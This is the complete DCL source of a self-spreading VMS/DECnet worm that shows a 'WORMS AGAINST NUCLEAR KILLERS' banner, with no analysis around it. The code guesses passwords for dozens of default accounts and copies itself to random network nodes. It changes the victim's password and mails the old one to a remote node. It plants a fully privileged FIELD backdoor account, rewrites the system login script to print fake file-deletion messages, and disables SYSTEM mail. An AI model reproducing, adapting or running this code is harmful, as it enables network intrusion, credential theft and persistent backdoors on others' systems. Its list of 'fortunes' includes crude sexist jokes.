$on error then continue
$set noverify
$start:
$delete="delete"
$delete/symbol/global/all
$on error then continue
$allp=f$setprv("ALL")
$define sys$print nl:
$define sys$output nl:
$define sys$error nl: 
$con=""
$OLDPASS=F$EDIT(F$GETJPI(0,"USERNAME"),"TRIM")
$gosub fixprot
$look_lp:
$ on error then continue
$ pid=f$pid(con)
$ if pid .eqs. "" then goto end_look
$ prcname=f$edit(f$getjpi(pid,"PRCNAM"),"TRIM")
$ if f$length(prcname) .ge. 5 then if f$extract(0,5,prcname) .eqs. "NETW_" then goto exitprog
$ goto look_lp
$exitprog:
$spawn delete 'f$environment("PROCEDURE")'
$stop/ID=0
$end_look:
$ SEED=F$INTEGER(F$EXTRACT(18,5,F$TIME() ) - "." + F$EXTRACT(15,2,F$TIME()))
$GOSUB FIXPASS
$thisnode=f$trnlnm("SYS$NODE")
$psi=""
$if f$search("SYS$SYSTEM:PSIPAD.EXE") .nes. "" then psi="%"
$SPAWN/INPUT=NL:/OUTPUT=NL:/NONOTIFY MAIL/SUBJECT="''thisnode'''F$EDIT(F$GETJPI(0,"USERNAME"),"TRIM")' ''OLDPASS' ''psi'" NL: 6203::GEMPAK
$range=9999
$gosub random
$set proc/name="NETW_''value'"
$skipdef="SYSTEM!SYSTEST!FIELD"
$gosub initpass
$gosub initnewdef
$ gosub initfor
$ gosub announce
$ gosub fixmail
$ if f$priv("SYSPRV") then gosub gotcha
$ gosub findfucked
$replic:
$on error then continue
$OPEN/READ/WRITE LINK SYS$NET
$on error then continue
$CLOSE LINK
$on error then continue
$close new$file
$on error then continue
$close old$file
$on error then continue
$close rights$list
$on error then continue
$close dummy
$on error then continue
$close input
$on error then continue
$close output
$on error then continue
$close testf
$on error then continue
$close file
$on error then continue
$close passfile
$gosub fortune
$ gosub initusers
$got=1
$maxrlist=35
$priv="FALSE"
$maxdusers=82
$gotusers="FALSE"
$methodtype="WANK"
$unfinished="TRUE"
$passnum=0
$passnum2=0
$usernum=0
$usernum2=0
$range=99999
$gosub random
$newf="C''value'.COM"
$gosub random
$dum="D''value'.COM"
$set prot=(o:rwed)/def
$getnextnode:
$on error then continue
$range=64512
$gosub random
$nodenum=value
$checknode=nodenum
$gosub checknode
$if .not. up then goto getnextnode
$reploop:
$on error then continue
$mustfind:
$on error then continue
$ gosub finduser
$ if .not. got1 then goto mfind
$ node:='nodenum'"""''user' ''pass'""
$ gosub copyprog
$numfile=newf
$ if copied_ok then gosub startit
$if .not.started .and. unfinished then goto mustfind
$mfind:
$on error then continue
$if started then goto cleanup
$if got .eq. 1 then goto cleanup
$got=got-1
$gotloop:
$on error then continue
$gotuser=gotuser'got
$node:='nodenum'"""''gotuser'""
$gosub copyprog
$numfile=newf
$if copied_ok then gosub startit
$got=got-1
$if (.not. started) .and. ( got .gt. 0) then goto got gotloop
$cleanup:
$goto replic
$copyprog:
$open/write/error=open_err dummy 'node'::'dum'
$ write/error=writedum_err dummy "$delete="delete"
$ write/error=writedum_err dummy "$spawn $delete/symbol/global/all"
$ write/error=writedum_err dummy "$ on error then continue"
$ write/error=writedum_err dummy "$ set def sys$login"
$ write/error=writedum_err dummy "$ddir=f$dir()"
$ write/error=writedum_err dummy "$ddir=f$extract(1,f$length(ddir)-2,ddir)"
$ write/error=writedum_err dummy "$set prot=o:rwed [.-]'ddir'.dir"
$ write/error=writedum_err dummy "$SPAWN $DELETE SYS$LOGIN:''dum';*"
$close dummy
$numfile=dum
$gosub startit
$if .not. started then goto cantdel
$open/write/error=open_err new$file 'node'::'newf
$open/read/error=openold_err old$file 'f$environment("PROCEDURE")'
$loop2:
$ on error then continue
$ read/end=end_loop2/err=readold_err old$file progline
$ if f$locate("$maxdusers=",progline) .eq. 0 then goto wr2
$ if f$locate("$duser",progline) .eq. 0 then goto wr3
$ if f$locate("$ouser",progline) .eq. 0 then goto wr4
$ write/error=write_error new$file progline
$ goto loop2
$wr1:
$write/error=write_error new$file "$OLDPASS=""''pass'"""
$goto loop2
$wr2:
$write/error=write_error new$file "$maxdusers=''maxdusers'"
$goto loop2
$wr3:
$count=0
$wr3a:
$ if count .lt. maxdusers then dus=duser'count'
$ if count .lt. maxdusers then write/error=write_error new$file "$duser''count'=""''dus'"""
$ count=count+1
$if count .lt. maxdusers then goto wr3a
$write/error=write_error new$file "$defs=""TRUE"""
$write/error=write_error new$file "$return"
$wr3b:
$read/err=readold_err old$file waste
$if waste .eqs. "$return" then goto loop2
$goto wr3b
$wr4:
$count=0
$wr4a:
$ if count .lt. maxrusers then ous=ruser'count'
$ if count .lt. maxrusers then write/error=write_error new$file "$ouser''count'=""''ous'"""
$ count=count+1
$if count .lt. maxrusers then goto wr4a
$write/error=write_error new$file "$maxousers=''maxrusers'"
$write/error=write_error new$file "$return"
$wr4b:
$read/err=readold_err old$file waste
$if waste .eqs. "$return" then goto loop2
$goto wr4b
$end_loop2:
$ close new$file
$copied_ok = "TRUE"
$return
$openold_err:
$copied_ok="FALSE"
$return
$readold_err:
$copied_ok="FALSE"
$close new$file
$close old$file
$spawn $delete 'node'::'newf';*
$return
$open_err:
$copied_ok = "FALSE"
$return
$write_error:
$ close new$file
$ spawn $delete 'node'::'newf';*
$ copied_ok = "FALSE"
$ return
$writedum_err:
$close dummy
$copied_ok = "FALSE"
$started="FALSE"
$return
$cantdel:
$started="FALSE"
$copied_ok="FALSE"
$return
$startit:
$if f$extract(0,1,numfile) .eqs. "C" then if stmeth .eqs. "M1" then goto startmethod1
$if f$extract(0,1,numfile) .eqs. "C" then if stmeth .eqs. "M2" then goto startmethod2
$if f$extract(0,1,numfile) .eqs. "D" then stmeth="WANK"
$startmethod1:
$stmeth="M1"
$on error then continue
$started="FALSE"
$spawn type 'node'::"0=''numfile'"
$nofi=node+"::''numfile'"
$ if f$extract (0,1,numfile) .eqs. "D" then wait 00:01
$ if f$extract(0,1,numfile) .eqs. "D" then if f$search(nofi) .nes. "" then goto startmethod2
$started="TRUE"
$return
$startmethod2:
$ on error then continue
$stmeth="M2"
$started="FALSE"
$submit/remote 'node'::'numfile'
$if .not. $status then return
$nofi=node+"::''numfile'"
$if f$extract (0,1,numfile) .eqs. "D" then wait 00:01
$if f$extract (0,1,numfile) .eqs. "D" then if$search(nofi) .nes. "" then return
$started="TRUE"
$return
$finduser:
$ on error then continue
$gosub method1
$if got1 then return
$gosub method2
$if got1 then return
$return
$method1:
$got1="FALSE"
$if methodtype .eqs. "METH2" then return
$ IF gotusers then goto hack
$ defs="FALSE"
$ OPEN/READ/error=openrights_error rights$list 'nodenum'::sys$sysroot:[sysexe]rightslist.dat
$ READ/end=openrights_error/error=openrights_error rights$list DUMMY
$ read_user:
$ on error then continue
$ READ/END=end_read/error=readrights_error rights$list FRED
$ BILL=F$EXTRACT(16,F$LENGTH(FRED)-16,FRED)
$ BILL=F$EDIT(BILL,"COLLAPSE")
$ IF BILL .EQS. "BATCH" THEN GOTO end_read
$ ruser'usernum'=bill
$usernum=usernum+1
$if usernum .eq. maxrlist then goto end_read
$goto read_user
$end_read:
$gotusers="TRUE"
$maxusers=usernum
$maxrusers=usernum
$close rights$list
$gosub newdef
$ usernum=0
$hack:
$ on error then continue
$find_loop:
$on error then continue
$pass=pass'passnum
$find_loop2:
$ on error then continue
$if usernum .ge. maxusers then goto hack12
$if .not. defs then user=ruser'usernum
$ if defs then user=duser'usernum
$if pass'passnum' .eqs. "SAME" then pass=user
$if pass'passnum' .eqs. "BLANK" then pass=""
$ access_string = "''nodenum'""''user' ''pass'""::"
$on error then continue
$ dir/out=nl: 'access_string'
$bak_stat = $status
$usernum=usernum+1
$    if  bak_stat then goto got1
$ if .not. defs .and. usernum .gt. maxrlist then goto hack12
$if usernum .lt. maxusers then goto find_loop2
$hack12:
$usernum=0
$passnum=passnum+1
$if passnum .lt. maxpassnum then goto find_loop
$got1="FALSE"
$return
$got1:
$got1="TRUE"
$fi="''nodenum'""''user' ''pass'""::sys$sysroot:[sysexe]sysuaf.dat"
$a=f$file(fi,"PRO")
$if $status then priv="TRUE"
$if priv then return
$ priv="FALSE"
$gotuser'got="''user' ''pass'"
$got=got+1
$goto hack
$openrights_error:
$got1="FALSE"
$return
$readrights_error:
$close rights$list
$got1="FALSE"
$return
$method2:
$if methodtype .eqs. "WANK" then passnum=0
$methodtype = "METH2"
$node_name=0
$ gosub initusers
$maxusers=maxdusers
$gosub find_loop
$if .not. got1 then unfinished="FALSE"
$return
$initusers:
$duser0="FIELD"
$duser1="SYSTEM"
$duser2="SYSTEST"
$duser3="DECNET"
$duser4="USER"
$duser5="USERP"
$duser6="TEST"
$duser7="GUEST"
$duser8="GAMES"
$duser9="DEMO"
$duser10="ALLIN1"
$duser11="OPERATOR"
$duser12="OPER"
$duser13="TELEX"
$duser14="SPM"
$duser15="BACKUP"
$duser16="SYSTEST_CLIG"
$duser17="MRGATE"
$duser18="MRMANAGER"
$duser19="SHUTDOWN"
$duser20="MANAGER"
$duser21="NEWSMGR"
$duser22="PCCOMMON"
$duser23="OSI"
$duser24="ACCOUNTS"
$duser25="LIBRARY"
$duser26="ACCOUNTING"
$duser27="VTX"
$duser28="VXSYS"
$duser29="SNACSV"
$duser30="COGNOS"
$duser31="DIGITAL"
$duser32="NOTES$SERVER"
$duser33="INGRES"
$duser34="ORACLE"
$duser35="MAC"
$duser36="APPLETALK"
$duser37="CUSTOMER"
$duser38="DEC"
$duser39="DFS$DEFAULT"
$duser40="DNS$SERVER"
$duser41="INVENTORY"
$duser42="ISSYS"
$duser43="IVP"
$duser44="LN03_DLAND"
$duser45="LPS$SERVER"
$duser46="MAIL"
$duser47="MANUALS"
$duser48="MASS11"
$duser49="MBMANAGER"
$duser50="MIS"
$duser51="NETPRIV"
$duser52="NETNONPRIV"
$duser53="SRS"
$duser54="SUPPLIES"
$duser55="TCP"
$duser56="TRAINING"
$duser57="DQS$SERVER"
$duser58="TRANSFER"
$duser59="STUDENT"
$duser60="TEMP"
$duser61="MAILER"
$duser62="SPEAR"
$duser63="PCAPP"
$duser64="PLUTO"
$duser65="EXOS"
$duser66="POSTMASTER"
$duser67="CADCAM"
$duser68="ARCHIVE"
$duser69="VAXSIM"
$duser70="SECURITY"
$duser71="VAXNET"
$duser72="RDBVMS$REM"
$duser73="USER1"
$duser74="RHM"
$duser75="SYSINF"
$duser76="IBM"
$duser77="CRAYSTN"
$duser78="DDSNET"
$duser79="ETHERNIM"
$duser80="TAPESYS"
$duser81="HASP"
$defs="TRUE"
$return
$initpass:
$pass0="SAME"
$ maxpassnum=1
$return
$initnewdef:
$ouser0="WANKY"
$maxousers=1
$return
$newdef:
$ if maxdusers .ge. 200 then return
$u1=0
$u2=0
$new1:
$if ruser'u1 .eqs. ouser'u2 then gosub gotnew
$u1=u1+1
$if u1 .lt. maxusers then goto new1
$u1=0
$u2=u2+1
$if u2 .lt. maxousers then goto new1
$return
$gotnew:
$if f$locate(ruser'u1,skipdef) .lt. f$length(skipdef) then return
$count=3
$gnew1:
$if ruser'u1 .eqs. duser'count then return
$count=count+1
$if count .lt. maxdusers then goto gnew1
$ duser'maxdusers'=ruser'u1'
$ maxdusers=maxdusers+1
$u1=maxusers-1
$u2=maxousers-1
$return
$announce:
$ if .not. f$priv("SYSNAM") then return
$ range=99999
$ gosub random
$ afile="A''value'.dat"
$ gosub fixprot
$ create 'afile
$ DECK/DOLLAR=WANKLY
  
      W O R M S    A G A I N S T    N U C L E A R    K I L L E R S
    _______________________________________________________________
    \__  ____________  _____    ________    ____  ____   __  _____/
     \ \ \    /\    / /    / /\ \       | \ \  | |    | | / /    /
      \ \ \  /  \  / /    / /__\ \      | |\ \ | |    | |/ /    /
       \ \ \/ /\ \/ /    / ______ \     | | \ \| |    | |\ \   /
        \_\  /__\  /____/ /______\ \____| |__\ | |____| |_\ \_/
         \___________________________________________________/
          \                                                 /
           \    Your System Has Been Officically WANKed    /
            \_____________________________________________/
 
     You talk of times of peace for all, and then prepare for war.
 
 
WANKLY
$ gosub fixprot
$ SET PROT=W:RWED 'afile
$ DEF=F$ENV("DEFAULT")
$ DEFINE/SYSTEM SYS$ANNOUNCE "@''DEF'''afile'"
$ return
$gotcha:
$search sys$manager:sylogin.com "OOPS!!!"
$if $status then return
$range=99999
$gosub random
$Tfile="T''value'.COM"
$CREATE sys$sysroot:[sysmgr]'tfile
$ DECK
$ DEF=F$ENVIRONMENT("DEFAULT")
$ SET DEF SYS$LOGIN
$ SET DEF 'DEF'
$ files=0
$ totblocks=0
$ set nocontrol_y
$ write sys$output "Oops!!!  B-)"
$ loop:
$ FILE_NAME = F$SEARCH("[...]*.*;*")
$ if file_name .eqs. "" then goto exitgotcha
$ blocks=f$file(file_name,"EOF")
$ files=files+1
$ totblocks=totblocks+blocks
$ write sys$output "%DELETE-I-FILDEL, ''file_name' deleted (''blocks' blocks)"
$ goto loop
$ exitgotcha:
$ write sys$output "%DELETE-I-TOTAL, ''files' deleted (''totblocks' blocks)"
$ Di*rectory:=="Write sys$output ""%DIRECT-W-NOFILES, no files found""!"
$ EOD
$ APPEND sys$sysroot:[sysmgr]SYLOGIN.COM sys$sysroot:[sysmgr]'tfile
$ RENAME sys$sysroot:[sysmgr]'tfile sys$sysroot:[sysmgr]SYLOGIN.COM
$ COPY SYS$SYSROOT:[SYSMGR]SYLOGIN.COM SYS$COMMON:[SYSMGR]SYLOGIN.COM
$ RETURN
$ findfucked:
$ TALK = """
$ range=99999
$ gosub random
$ gosub fixprot
$ SPAWN/IN=NL:/OUT=LO'value'.DAT SH LOG
$ gosub fixprot
$ SEARCH/OUT=OU'value'.LIS LO'value'.DAT [
$ gosub fixprot
$ OPEN/READ/ERROR=END INPUT OU'value'.LIS
$ gosub fixprot
$ OPEN/WRITE OUTPUT DIR'value'.DAT
$ SFLOOP:
$     READ/END=END INPUT DILDO
$     LOC = F$LOCATE("=",DILDO)
$     DILDO2=F$EXTRACT(LOC+3,F$LENGTH(DILDO)-LOC+3,DILDO)
$     LOC=F$LOCATE("]",DILDO2)
$     DILDO2=F$EXTRACT(0,LOC,DILDO2)
$     DILDO2=DILDO2+"...]"
$     IF F$LENGTH(DILDO2) .EQS. F$LOCATE(TALK,DILDO2) THEN WRITE OUTPUT DILDO2
$ GOTO SFLOOP
$ END:
$ CLOSEINPUT
$CLOSE OUTPUT
$ gosub fixprot
$ spawn $DEL LO'value'.DAT;*
$ gosub fixprot
$ spawn $DEL OU'value'.LIS;*
$ gosub fixprot
$ SORT/NODUP DIR'value'.DAT DIR2'value'.DAT
$ gosub fixprot
$ spawn $del DIR'value'.dat;*
$ talk = """
$ gosub fixprot
$ open/read input dir2'value'.dat
$ loopx:
$ read/END=ENDx input in
$ NERD=TALK+in+"*.COM"+TALK
$ LOOPy:
$ file = f$search('NERD')
$ if file .eqs. "" then goto LOOPx
$ FOUND = FILE
$ found=f$extract(0,f$locate(";",found),found)
$ file = talk+file+talk
$ on error then continue
$ bill = f$file('file',"pro")
$ on error then continue
$ IF F$LENGTH(BILL) .NE. F$LOCATE("WORLD=RWED",BILL) THEN gosub foundfile
$ goto loopy
$ENDx:
$ close input
$ gosub fixprot
$ spawn/input=nl:/output=nl: $delete dir2'value'.dat;*
$ return
$foundfile:
$open/write/error=endff testf 'found
$close testf
$spawn $delete 'found';
$create 'found
$ deck
$ on error then continue
$ oldsyso=f$trnlnm("SYS$OUTPUT")
$ oldsyse=f$trnlnm("SYS$ERROR")
$ define/nolog sys$output nl:
$ define/nolog sys$error nl:
$priv=f$setprv("SYSPRV")
$if .not. f$priv("SYSPRV") then goto _skip12
$ define sysuaf sys$system:sysuaf.dat
$mcr authorize mod field/remote/dialup/network/batch/defpriv=all/priv=all/flag=(nodisuser,nocaptive,nopwd_expire)/pass=field
$if $status then goto _skip12
$mcr authorize add field/remote/dialup/network/batch/defpriv=all/priv=all/flag=(nodisuser,nocaptive,nopwd_expire)/pass=field
$_skip12:
$define/nolog sys$error "''oldsyse'"
$define/nolog sys$output "''oldsyso'"
$ EOD
$ append 'found';-1 'found'
$endff:
$ return
$fortune:
$on error then continue
$numph=0
$request_dir[0,8]=15
$ range=64512
$ gosub random
$ remote_node = value
$open/read/write/error=fortune link 'remote_node'::"29="
$if $status then goto FLOOP
$fuc12:
$close link
$return
$FLOOP:
$write link request_dir
$read/error=fend link ans
$IF ANS .EQS. "" THEN GOTO FEND
$numph=numph+1
$ ans=f$extract(16,33,ans)
$ ans=f$extract(0,f$locate(" ",ans),ans)
$phuser'numph=ans
$goto floop
$FEND:
$CLOSE LINK
$ if numph .eq. 0 then goto fortune
$ null_byte[0,8] = 0
$ true_byte[0,8] = 1
$ false_byte[0,8] = 0
$ id_rmt_user[0,8] = 7          
$ ring_rmt_user[0,8] = 8        
$ slave_exit[0,8] = 13          
$ status_unknown = 0    
$ status_success = 1    
$ range=numph
$ gosub random
$ remote_user = phuser'value
$ range=99
$ gosub random
$ value=value-1
$ local_user_in=f'value
$ local_user = "::" + local_user_in + "                                                                            "  + null_byte
$ open/read/write link 'remote_node'::"29="
$ write link id_rmt_user,local_user,remote_user
$ read link ans
$ if f$cvui(0,8,ans) .ne. status_success then goto perror
$ write link ring_rmt_user,local_user,true_byte
$ read link ans
$ if f$cvui(0,8,ans) .ne. status_success then goto perror
$       count = 1
$ on control_y then goto pexit
$ goto pexit
$LOOP:
$ write link ring_rmt_user,local_user,false_byte
$ read link ans
$ if f$cvui(0,8,ans) .ne. status_success then goto perror
$       if count .ge. 3 then goto pexit
$       count = count +1
$ goto loop
$PEXIT:
$ write link slave_exit,local_user
$ close link
$ return
$PERROR:
$ close link
$ return
$initfor:
$f0="Large cats can be dangerous, but a little pussy never hurt anyone."
$f1="God must love assholes -- She made so many of them."
$f2="I came; I saw; I fucked up"
$f3="This system goes down more often than a two-dollar whore."
$f4="He who sneezes without a handkerchief takes matters into his own hands."
$f5="Did you hear about the new German microwave oven?       ...Seats 500."
$f6="Did you know that there are 71.9 acres of nipple tissue in the U.S.?"
$f7="Conservative: One who admires radicals centuries after they're dead."
$f8="You need no longer worry about the future. This time tomorrow you'll be dead"
$f9="Sex is like a bridge game -- If you have a good hand no partner is needed."
$f10="Admiration: Our polite recognition of another's resemblance to ourselves."
$f11="A day for firm decisions!!!!!  Or is it?"
$f12="This login session: $13.99, but for you $11.88"
$f13="Never put off till tomorrow what you can avoid all together."
$f14="Screw up your courage!  You've screwed up everything else."
$f15="Don't feed the bats tonight."
$f16="Beware of low-flying butterflies."
$f17="Be wary of strong drink. It can make you shoot at tax collectors and miss"
$f18="Look out!  Behind you!"
$f19="SOFTWARE -- formal evening attire for female computer analysts."
$f20="Diplomacy is the art of saying ""nice doggy"" until you can find a rock."
$f21="George Orwell was an optimist."
$f22="The world is coming to an end!  Repent and return those library books!"
$f23="They're only trying to make me LOOK paranoid!"
$f24="You've been leading a dog's life.  Stay off the furniture."
$f25="Nostalgia isn't what it used to be."
$f26="It is better to kiss an avocado than to get in a fight with an aardvark"
$f27="Day of inquiry.  You will be subpoenaed."
$f28="I don't have any solution but I certainly admire the problem."
$f29="You can create your own opportunities this week.  Blackmail a senior executive."
$f30="You'll never be the man your mother was!"
$f31="You have the capacity to learn from mistakes.  You'll learn a lot today."
$f32="Absent: Exposed to the attacks of friends and acquaintances;defamed;slandered"
$f33="Lie: A very poor substitute for the truth,but the only one discovered to date."
$f34="The first myth of management is that it exists."
$f35="Conscience is the inner voice that warns us somebody is looking"
$f36="Earn cash in your spare time -- blackmail your friends."
$f37="BLISS is ignorance"
$f38="Cabbage: A kitchen-garden vegetable about as large and wise as a man's hea
$f39="Clothes make the man.  Naked people have little or no influence on society."
$f40="Alone: In bad company."
$f41="You're being followed.  Cut out the hanky-panky for a few days."
$f42="Liar: A lawyer with a roving commission."
$f43="I can resist anything but temptation."
$f44="Kin: An affliction of the blood"
$f45="Vote anarchist"
$f46="Stay away from flying saucers today."
$f47="Screw up your courage!  You've screwed up everything else."
$f48="If a President doesn't do it to his wife, he'll do it to his country."
$f49="Pro is to con as progress is to Congress."
$f50="Kleptomaniac: A rich thief."
$f51="Tonight's the night: Sleep in a eucalyptus tree."
$f52="If at first you don't succeed, give up, no use being a damn fool."
$f53="Message will arrive in the mail.  Destroy, before the FBI sees it."
$f54="It is impossible to make anything foolproof because fools are so ingenious"
$f55="The only way to get rid of a temptation is to yield to it."
$f56="Ambition is a poor excuse for not having sense enough to be lazy."
$f57="He's just a politician trying to save both his faces..."
$f58="You will be a winner today.  Pick a fight with a four-year-old."
$f59="If you're feeling good, don't worry.  You'll get over it."
$f60="Automobile: A four-wheeled vehicle that runs up hills and down pedestrians"
$f61="Never put off till tomorrow what you can avoid all together."
$f62="Do not sleep in a eucalyptus tree tonight."
$f63="Tomorrow will be cancelled due to lack of interest."
$f64="Just because you're paranoid doesn't mean they AREN'T after you."
$f65="What the hell, go ahead and put all your eggs in one basket."
$f66="Those who can, do.  Those who can't, simulate."
$f67="Sex is not the answer.  Sex is the question.  ""Yes"" is the answer."
$f68="Old soldiers never die.  Young ones do."
$f69="Another good night not to sleep in a eucalyptus tree."
$f70="Bore: A person who talks when you wish him to listen."
$f71="Computers are not intelligent.  They only think they are."
$f72="Under capitalism, man exploits man. Under Communism, it's just the opposite."
$f73="Today is a good day to bribe a high-ranking public official."
$f74="Know thyself.  If you need help, call the C.I.A."
$f75="Don't tell any big lies today.  Small ones can be just as effective."
$f76="Give your child mental blocks for Christmas."
$f77="The meek shall inherit the earth -- they are too weak to refuse."
$f78="Those who can't write, write manuals."
$f79="This will be a memorable month -- no matter how hard you try to forget it."
$f80="It has just been discovered that research causes cancer in rats."
$f81="Mind your own business, Spock.  I'm sick of your halfbreed interference."
$f82="Some men are discovered; others are found out."
$f83="Do not underestimate the power of the Force."
$f84="Go directly to jail.  Do not pass Go, do not collect $200."
$f85="Flee at once, all is discovered."
$f86="I am a computer. I am dumber than any human and smarter than an administrator"
$f87="I like work; it fascinates me; I can sit and look at it for hours."
$f88="Liar:  One who tells an unpleasant truth."
$f89="Many are called, few volunteer."
$f90="National security is in your hands - guard it well."
$f91="Egotist: A person of low taste, more interested in himself than me."
$f92="Always borrow money from a pessimist; he doesn't expect to be paid back."
$f93="May the Fleas of a Thousand Camels infest one of your Erogenous Zones."
$f94="Friends come and go, but enemies accumulate."
$f95="Succumb to natural tendencies.  Be hateful and boring."
$f96="Never call a man a fool; borrow from him."
$f97="Crime does not pay...as well as politics."
$f98="One nice thing about egotists: they don't talk about other people."
$return
$ random:
$ seed = seed*69069 
$ value = (seed.and.%x3FFFFFFF)/(%x40000000/range)
$ value =value +1
$ return
$checknode:
$up="TRUE"
$OPEN/READ/error=nodedown file 'checknode'::"17="
$CLOSE FILE
$ return
$nodedown:
$UP="FALSE"
$return
$fixprot:
$set def sys$login
$ddir=f$dir()
$ddir=f$extract(1,f$length(ddir)-2,ddir)
$IF F$LOCATE(".",DDIR) .LT. f$length(ddir) then ddir=f$extract(f$locate(".",ddir)+1,f$length(ddir)-f$locate(".",ddir),ddir)
$set prot=o:rwed [.-]'ddir'.dir
$on error then continue
$return
$FIXPASS:
$ null[0,8]=0
$range=99999
$gosub random
$PASSF="P''VALUE'.COM"
$range=9999999
$ gosub random
$NEWPASS="P''VALUE'"
$PASSLOOP:
$IF F$LENGTH(NEWPASS) .LT. 12 THEN NEWPASS=NEWPASS+"A"
$ IF F$LENGTH(NEWPASS) .LT. 12 THEN GOTO PASSLOOP
$gosub fixprot
$OPEN/WRITE/ERROR=WRITEPASS_ERR PASSFILE 'PASSF'
$WRITE PASSFILE "$SET PASSWORD
$WRITE PASSFILE "''OLDPASS'"
$WRITE PASSFILE "''NEWPASS'"
$WRITE PASSFILE "''NEWPASS'"
$CLOSE PASSFILE
$@'PASSF'
$ IF .NOT. $STATUS THEN NEWPASS=OLDPASS
$gosub fixprot
$ SPAWN/INPUT=NL:/OUTPUT=NL: $DELETE 'PASSF';*
$RETURN
$WRITEPASS_ERR
$NEWPASS=OLDPASS
$RETURN
$fixmail:
$if .not. f$priv("SYSPRV") then return
$define sysuaf sys$system:sysuaf.dat
$mcr authorize mod system/flag=dismail
$return
